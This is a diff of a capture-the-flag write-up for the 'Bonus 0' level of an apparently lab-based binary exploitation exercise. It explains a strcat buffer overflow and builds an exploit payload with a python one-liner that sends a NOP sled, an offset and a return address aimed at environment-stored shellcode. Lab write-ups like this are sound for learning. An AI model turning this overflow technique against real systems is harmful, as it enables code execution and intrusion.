@@ -1,6 +1,7 @@
 # Bonus 0
 *password : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728*
 
+## Analyze
 ```
 $ scp -P 4242 bonus0@192.168.56.108:bonus0 binary/
 ```
@@ -8,12 +9,13 @@ $ scp -P 4242 bonus0@192.168.56.108:bonus0 binary/
 ```
     *(undefined2 *)(str + (~uVar2 - 1)) = 32;
 ```
-- 32 = `space`
-- uVar2 = `4294967295 - strlen(input1)`
-- `~uVar2 - 1` = len of input1
-- ex: if no overflow -> "input1`space`input2"
+32 = `space`\
+put a space at the end of input1
+ex: if no overflow output = "input1`space`input2"
 
-"reduce" shellcode :
+## Buffer overflow : strcat exploit
+
+- "reduce" shellcode :
 ```
 $ scp -P 4242 bonus0/Ressources/getenv.c bonus0@192.168.56.108:/tmp/
 ```
@@ -24,6 +26,8 @@ $ gcc getenv.c
 $ ./a.out
 0xbffff83f
 ```
+- overflow on the input 2
+- compute offset : 9
 
 ```
 $ python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "\x3f\xf8\xff\xbf" + "\x42" * 8' > /tmp/bonus0
